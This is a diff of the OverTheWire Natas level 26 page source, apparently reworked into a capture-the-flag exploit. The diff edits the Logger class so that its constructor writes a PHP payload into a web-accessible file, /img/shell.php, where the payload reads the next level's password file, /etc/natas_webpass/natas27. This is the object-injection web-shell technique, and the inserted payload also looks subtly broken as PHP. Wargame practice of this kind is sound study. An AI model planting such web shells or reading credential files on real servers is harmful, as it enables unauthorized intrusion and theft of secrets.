@@ -1,29 +1,14 @@
-<html>
-<head>
-<!-- This stuff in the header has nothing to do with the level -->
-<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
-<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
-<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
-<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
-<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
-<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
-<script>var wechallinfo = { "level": "natas26", "pass": "<censored>" };</script></head>
-<body>
 <?php
-    // sry, this is ugly as hell.
-    // cheers kaliman ;)
-    // - morla
-
     class Logger{
         private $logFile;
         private $initMsg;
         private $exitMsg;
 
-        function __construct($file){
+        function __construct(){
             // initialise variables
-            $this->initMsg="#--session started--#\n";
+            $this->initMsg="<?php cat /etc/natas_webpass/natas27 ?> ";
             $this->exitMsg="#--session end--#\n";
-            $this->logFile = "/tmp/natas26_" . $file . ".log";
+            $this->logFile = "/img/shell.php";
 
             // write initial message
             $fd=fopen($this->logFile,"a+");
@@ -133,7 +118,3 @@ Y2<input type="text" name="y2" size=2>
 
 ?>
 
-<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
-</div>
-</body>
-</html>
